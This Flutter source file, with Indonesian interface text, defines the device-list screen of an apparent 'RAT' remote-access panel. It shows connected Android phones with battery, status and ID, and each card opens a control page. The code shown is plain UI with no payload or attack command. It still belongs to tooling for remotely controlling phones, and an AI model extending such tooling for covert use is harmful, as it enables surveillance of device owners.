import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import 'rat_client.dart';
import 'rat_control_page.dart';
import '../theme/neo.dart';

class RatDeviceListPage extends StatefulWidget {
  final RatClient client;
  const RatDeviceListPage({super.key, required this.client});

  @override
  State<RatDeviceListPage> createState() => _RatDeviceListPageState();
}

class _RatDeviceListPageState extends State<RatDeviceListPage> {
  RatClient get client => widget.client;

  @override
  void initState() {
    super.initState();
    client.addListener(_onClient);
    if (!client.isConnected && client.authError == null) {
      client.connect();
    }
    if (client.uid == null) client.fetchMe();
  }

  @override
  void dispose() {
    client.removeListener(_onClient);
    super.dispose();
  }

  void _onClient() {
    if (mounted) setState(() {});
  }

  void _toast(String msg, {bool error = false, bool info = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context)
      ..clearSnackBars()
      ..showSnackBar(SnackBar(
        content: Text(msg,
            style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11)),
        backgroundColor: error
            ? Neo.coral
            : info
                ? Neo.sky
                : Neo.mint,
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 3),
      ));
  }

  void _openControl(RatDevice d) {
    Navigator.of(context).push(
      MaterialPageRoute(
        builder: (_) => RatControlPage(client: client, initialDeviceId: d.id),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      body: AnimatedBuilder(
        animation: client,
        builder: (context, _) {
          if (client.authError != null) return _buildAuthError();
          return SafeArea(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                _buildHeader(),
                if (!client.isConnected)
                  _ConnectingBar(
                    onRetry: () {
                      client.disconnect();
                      client.connect();
                      _toast('Menyambungkan ulang...', info: true);
                    },
                  ),
                _buildUidBar(),
                _buildStats(),
                Expanded(
                  child: client.devices.isEmpty
                      ? _buildEmpty()
                      : _buildGrid(),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(Neo.radiusM),
          color: Neo.white,
          border: Border.all(color: Neo.black, width: Neo.borderWB),
          boxShadow: Neo.shadow(offset: 5),
        ),
        child: Row(
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(Neo.radiusS),
                color: Neo.lavender,
                border: Border.all(color: Neo.black, width: 2),
              ),
              child: const Icon(Icons.phonelink_rounded,
                  color: Neo.white, size: 20),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'PERANGKAT RAT',
                    style: TextStyle(
                      color: Neo.black,
                      fontWeight: FontWeight.w800,
                      fontSize: 15,
                      letterSpacing: 1,
                    ),
                  ),
                  const SizedBox(height: 2),
                  Text(
                    '${client.devices.length} PERANGKAT TERHUBUNG',
                    style: const TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 8.5,
                      letterSpacing: 1.5,
                      color: Neo.textMuted,
                    ),
                  ),
                ],
              ),
            ),
            GestureDetector(
              onTap: () {
                client.disconnect();
                client.connect();
                _toast('Menyambungkan ulang...', info: true);
              },
              child: Container(
                width: 40,
                height: 40,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(color: Neo.black, width: 2),
                  color: Neo.mint,
                ),
                child: const Icon(Icons.refresh_rounded,
                    color: Neo.black, size: 20),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildUidBar() {
    final uid = client.uid;
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 0),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(Neo.radiusM),
          color: Neo.white,
          border: Border.all(color: Neo.black, width: Neo.borderW),
          boxShadow: Neo.shadow(offset: 4),
        ),
        child: Row(
          children: [
            Container(
              width: 38,
              height: 38,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(Neo.radiusS),
                border: Border.all(color: Neo.black, width: 2),
                color: Neo.mint,
              ),
              child: const Icon(Icons.fingerprint, color: Neo.black, size: 18),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text('UID',
                      style: TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 8,
                          letterSpacing: 2,
                          color: Neo.textMuted)),
                  const SizedBox(height: 4),
                  Text(
                    uid ?? 'MENGAMBIL UID...',
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                    style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 14,
                      fontWeight: FontWeight.w700,
                      letterSpacing: 1,
                      color: uid != null ? Neo.black : Neo.textMuted,
                    ),
                  ),
                ],
              ),
            ),
            const SizedBox(width: 8),
            if (uid != null)
              GestureDetector(
                onTap: () {
                  Clipboard.setData(ClipboardData(text: uid));
                  _toast('UID disalin');
                },
                child: Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 12, vertical: 9),
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(Neo.radiusS),
                    color: Neo.mint,
                    border: Border.all(color: Neo.black, width: 2),
                    boxShadow: Neo.shadow(offset: 3),
                  ),
                  child: const Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(Icons.copy, size: 13, color: Neo.black),
                      SizedBox(width: 6),
                      Text('SALIN',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 9,
                              letterSpacing: 1.5,
                              color: Neo.black)),
                    ],
                  ),
                ),
              )
            else
              Padding(
                padding: const EdgeInsets.only(right: 16),
                child: SizedBox(
                  width: 16,
                  height: 16,
                  child: const CircularProgressIndicator(
                      strokeWidth: 2, color: Neo.mint),
                ),
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildStats() {
    final online = client.devices.where((d) => d.online).length;
    final offline = client.devices.length - online;
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 12, 16, 2),
      child: Row(
        children: [
          _StatChip(
            label: 'ONLINE',
            value: online,
            color: Neo.mint,
            icon: Icons.circle,
          ),
          const SizedBox(width: 10),
          _StatChip(
            label: 'OFFLINE',
            value: offline,
            color: Neo.textMuted,
            icon: Icons.radio_button_unchecked,
          ),
          const Spacer(),
          const Text(
            'TAP KARTU UNTUK KONTROL',
            style: TextStyle(
              fontFamily: 'ShareTechMono',
              fontSize: 7.5,
              letterSpacing: 1.2,
              color: Neo.textMuted,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAuthError() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 76,
              height: 76,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: Neo.coral,
                border: Border.all(color: Neo.black, width: 3),
                boxShadow: Neo.shadow(offset: 4),
              ),
              child: const Icon(Icons.error_outline,
                  color: Neo.white, size: 34),
            ),
            const SizedBox(height: 18),
            Text(
              client.authError ?? 'SESI TIDAK VALID',
              textAlign: TextAlign.center,
              style: const TextStyle(
                  fontFamily: 'ShareTechMono',
                  color: Neo.black,
                  fontSize: 13,
                  letterSpacing: 1),
            ),
            const SizedBox(height: 8),
            const Text(
              'TOKEN TIDAK DIKENALI BACKEND RAT.\nLOGIN ULANG / SAMBUNGKAN BACKEND.',
              textAlign: TextAlign.center,
              style: TextStyle(
                  fontFamily: 'ShareTechMono',
                  color: Neo.textMuted,
                  fontSize: 9,
                  letterSpacing: 1),
            ),
            const SizedBox(height: 20),
            NeoButton(
              label: 'COBA LAGI',
              icon: Icons.refresh,
              color: Neo.mint,
              onPressed: () {
                client.disconnect();
                client.connect();
                _toast('Mencoba ulang...', info: true);
              },
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildEmpty() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 96,
            height: 176,
            padding: const EdgeInsets.all(7),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(Neo.radiusL),
              color: Neo.cream,
              border: Border.all(color: Neo.black, width: Neo.borderWB),
              boxShadow: Neo.shadow(offset: 6),
            ),
            child: Container(
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(Neo.radiusM),
                border: Border.all(color: Neo.black, width: 2),
                color: Neo.white,
              ),
              child: Stack(
                alignment: Alignment.center,
                children: [
                  const Icon(Icons.phonelink_off_rounded,
                      color: Neo.textMuted, size: 34),
                  Positioned(
                    top: 8,
                    child: Container(
                      width: 34,
                      height: 4,
                      decoration: BoxDecoration(
                        color: Neo.textMuted,
                        borderRadius: BorderRadius.circular(3),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(height: 22),
          const Text(
            'BELUM ADA PERANGKAT',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 12,
                letterSpacing: 2,
                color: Neo.black),
          ),
          const SizedBox(height: 6),
          const Text(
            'TUNGGU PERANGKAT MENYAMBUNG...',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 8,
                letterSpacing: 2,
                color: Neo.textMuted),
          ),
          const SizedBox(height: 18),
          const Text(
            'UID DARI AKUN ANDA — OTOMATIS TERHUBUNG KE RAT',
            style: TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 7,
                letterSpacing: 1,
                color: Neo.textMuted),
          ),
        ],
      ),
    );
  }

  Widget _buildGrid() {
    return GridView.builder(
      padding: const EdgeInsets.fromLTRB(16, 6, 16, 24),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2,
        mainAxisSpacing: 12,
        crossAxisSpacing: 12,
        childAspectRatio: 0.82,
      ),
      itemCount: client.devices.length,
      itemBuilder: (context, i) {
        final d = client.devices[i];
        return _PhoneCard(device: d, client: client, onTap: () => _openControl(d));
      },
    );
  }
}

// ── Dialog rename device (keyed by deviceId) ──
void _renameDeviceDialog(BuildContext context, RatClient client, RatDevice device) {
  final ctrl = TextEditingController(text: device.name);
  showDialog(
    context: context,
    builder: (_) => AlertDialog(
      backgroundColor: Neo.white,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(Neo.radiusM),
        side: const BorderSide(color: Neo.black, width: Neo.borderWB),
      ),
      elevation: 0,
      title: const Text('RENAME DEVICE',
          style: TextStyle(color: Neo.black, fontWeight: FontWeight.w800, letterSpacing: 1)),
      content: NeoInput(
        controller: ctrl,
        hint: 'Nama baru device',
      ),
      actions: [
        NeoButton(
          label: 'BATAL',
          color: Neo.cream,
          expand: false,
          height: 44,
          onPressed: () => Navigator.pop(context),
        ),
        NeoButton(
          label: 'SIMPAN',
          color: Neo.mint,
          expand: false,
          height: 44,
          onPressed: () async {
            final name = ctrl.text.trim();
            if (name.isEmpty) {
              Navigator.pop(context);
              return;
            }
            Navigator.pop(context);
            await client.renameDevice(device.id, name);
          },
        ),
      ],
    ),
  );
}

// ── Stat chip kecil ──
class _StatChip extends StatelessWidget {
  final String label;
  final int value;
  final Color color;
  final IconData icon;
  const _StatChip({
    required this.label,
    required this.value,
    required this.color,
    required this.icon,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(Neo.radiusS),
        color: color,
        border: Border.all(color: Neo.black, width: 2),
        boxShadow: Neo.shadow(offset: 3),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, size: 9, color: Neo.black),
          const SizedBox(width: 6),
          Text(label,
              style: const TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 8,
                  letterSpacing: 1.2,
                  color: Neo.black)),
          const SizedBox(width: 6),
          Text('$value',
              style: const TextStyle(
                  fontFamily: 'ShareTechMono',
                  fontSize: 9,
                  fontWeight: FontWeight.w700,
                  color: Neo.black)),
        ],
      ),
    );
  }
}

// ── Kartu berbentuk HP ──
class _PhoneCard extends StatelessWidget {
  final RatDevice device;
  final RatClient client;
  final VoidCallback onTap;
  const _PhoneCard({required this.device, required this.client, required this.onTap});

  @override
  Widget build(BuildContext context) {
    final online = device.online;
    final battery = device.info.battery;
    final accent = online ? Neo.mint : Neo.cream;
    return GestureDetector(
      onTap: onTap,
      onLongPress: () => _renameDeviceDialog(context, client, device),
      child: Container(
        padding: const EdgeInsets.all(8),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(Neo.radiusL),
          color: Neo.white,
          border: Border.all(
              color: Neo.black, width: online ? Neo.borderWB : Neo.borderW),
          boxShadow: Neo.shadow(offset: online ? 5 : 3),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Row(
              children: [
                Container(
                  width: 7,
                  height: 7,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: online ? Neo.mint : Neo.textMuted,
                    border: Border.all(color: Neo.black, width: 1),
                  ),
                ),
                const SizedBox(width: 6),
                Expanded(
                  child: Text(
                    online ? 'ONLINE' : 'OFFLINE',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 7,
                        letterSpacing: 1.5,
                        color: online ? Neo.mint : Neo.textMuted),
                  ),
                ),
                if (battery != null)
                  Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(Icons.battery_full,
                          size: 12,
                          color: battery <= 20
                              ? Neo.coral
                              : battery <= 40
                                  ? Neo.peach
                                  : Neo.mint),
                      const SizedBox(width: 3),
                      Text('$battery%',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 8,
                              color: battery <= 20 ? Neo.coral : Neo.black)),
                    ],
                  ),
              ],
            ),
            const SizedBox(height: 6),
            Expanded(
              child: Container(
                decoration: BoxDecoration(
                  borderRadius: BorderRadius.circular(Neo.radiusM),
                  color: Neo.cream,
                  border: Border.all(color: Neo.black, width: 2),
                ),
                child: Stack(
                  children: [
                    Positioned(
                      top: 7,
                      left: 0,
                      right: 0,
                      child: Center(
                        child: Container(
                          width: 30,
                          height: 3.5,
                          decoration: BoxDecoration(
                            color: Neo.black.withValues(alpha: 0.3),
                            borderRadius: BorderRadius.circular(3),
                          ),
                        ),
                      ),
                    ),
                    Positioned(
                      top: 6,
                      right: 14,
                      child: Container(
                        width: 6,
                        height: 6,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          color: accent,
                          border: Border.all(color: Neo.black, width: 1),
                        ),
                      ),
                    ),
                    Center(
                      child: Padding(
                        padding: const EdgeInsets.symmetric(horizontal: 6),
                        child: Column(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Text(
                              device.name,
                              maxLines: 2,
                              overflow: TextOverflow.ellipsis,
                              textAlign: TextAlign.center,
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 11,
                                  fontWeight: FontWeight.w700,
                                  color: Neo.black),
                            ),
                            const SizedBox(height: 4),
                            Text(
                              device.id,
                              maxLines: 1,
                              overflow: TextOverflow.ellipsis,
                              textAlign: TextAlign.center,
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 6.5,
                                  color: Neo.textMuted),
                            ),
                          ],
                        ),
                      ),
                    ),
                    if (device.info.androidVersion != null)
                      Positioned(
                        bottom: 5,
                        left: 0,
                        right: 0,
                        child: Center(
                          child: Text(
                            'ANDROID ${device.info.androidVersion}',
                            style: const TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 6,
                                color: Neo.textMuted),
                          ),
                        ),
                      ),
                  ],
                ),
              ),
            ),
            const SizedBox(height: 6),
            Center(
              child: Text(
                'TAP UNTUK KONTROL',
                style: TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 6.5,
                    letterSpacing: 1.5,
                    color: online ? Neo.mint : Neo.textMuted),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class _ConnectingBar extends StatelessWidget {
  final VoidCallback onRetry;
  const _ConnectingBar({required this.onRetry});

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(Neo.radiusM),
          color: Neo.peach,
          border: Border.all(color: Neo.black, width: 2),
          boxShadow: Neo.shadow(offset: 3),
        ),
        child: Row(
          children: [
            const SizedBox(
              width: 12,
              height: 12,
              child: CircularProgressIndicator(
                  strokeWidth: 2, color: Neo.black),
            ),
            const SizedBox(width: 10),
            const Expanded(
              child: Text('TERPUTUS — MENYAMBUNG ULANG...',
                  style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 8,
                      letterSpacing: 1.5,
                      color: Neo.black)),
            ),
            GestureDetector(
              onTap: onRetry,
              child: const Text('RETRY',
                  style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 9,
                      letterSpacing: 1,
                      color: Neo.black)),
            ),
          ],
        ),
      ),
    );
  }
}
